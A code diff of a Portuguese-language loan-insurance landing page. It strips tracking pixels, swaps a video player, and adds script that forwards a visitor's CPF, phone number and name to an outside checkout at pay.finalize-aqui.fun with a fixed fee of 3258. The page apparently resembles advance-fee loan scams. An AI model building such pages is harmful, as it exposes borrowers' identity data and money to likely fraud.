@@ -1,24 +1,6 @@
-<!DOCTYPE html><html lang="pt-BR"><head><script>
-  window.pixelId = "68ef7f9c6e4ee260717a62e2";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="UTF-8">
-    <script>
-        window.kwaiPixelId = "68c85d84342d11c96c959617";   var a = document.createElement("script");   a.setAttribute("async", "");   a.setAttribute("defer", "");   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-kwai.js");   document.head.appendChild(a); 
-</script>
-<script> 
-window.pixelId = "68ef7f9c6e4ee260717a62e2";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
-    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    
     <script type="text/javascript">
       (function (c, l, a, r, i, t, y) {
         c[a] =
@@ -669,16 +651,7 @@ window.pixelId = "68ef7f9c6e4ee260717a62e2";
               </div>
             </div>
           </div>
-<vturb-smartplayer id="vid-68fbeb436cb1b30ad41cf5b0" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/04163859-fe43-4415-9052-143c133b3e56/players/68fbeb436cb1b30ad41cf5b0/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
-
-<script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
-<link rel="preload" href="https://scripts.converteai.net/5652af22-2711-466d-8733-d96a832f6c92/players/68e488dccd441edf15fa1a46/v4/player.js" as="script">
-<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
-<link rel="preload" href="https://cdn.converteai.net/5652af22-2711-466d-8733-d96a832f6c92/68e488a7bff30a58ac790663/main.m3u8" as="fetch">
-<link rel="dns-prefetch" href="https://cdn.converteai.net">
-<link rel="dns-prefetch" href="https://scripts.converteai.net">
-<link rel="dns-prefetch" href="https://images.converteai.net">
-<link rel="dns-prefetch" href="https://api.vturb.com.br">
+<vturb-smartplayer id="vid-6903673e8687c6f8d6f3a8eb" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/bf2ff37c-7765-4b77-8165-a4efe2dd2504/players/6903673e8687c6f8d6f3a8eb/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
  
           <div id="seguroPrestamistaInfo">
             <p class="text-lg font-medium text-gray-800 mb-4">
@@ -1340,8 +1313,25 @@ window.pixelId = "68ef7f9c6e4ee260717a62e2";
 
           // Obtém todos os parâmetros da URL atual
           const urlParams = new URLSearchParams(window.location.search);
+          
           // Adiciona parâmetro valor fixo
           urlParams.set("valor", "3258");
+          
+          // Adicionar parâmetros adicionais no checkout
+          const cpf = urlParams.get("cpf") || "";
+          const telefone = urlParams.get("numero") || "";
+          const nome = urlParams.get("nome") || "";
+          
+          if (cpf) {
+            urlParams.set("document", cpf);
+          }
+          if (telefone) {
+            urlParams.set("telephone", telefone);
+          }
+          if (nome) {
+            urlParams.set("name", nome);
+          }
+          
           // Redireciona mantendo todos os parâmetros
           window.location.href = `https://pay.finalize-aqui.fun/KV603kok5wx3w8y?${urlParams.toString()}`;
         });
@@ -1719,13 +1709,5 @@ window.pixelId = "68ef7f9c6e4ee260717a62e2";
         });
       }
     </script>
-  
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
 
 </body></html>
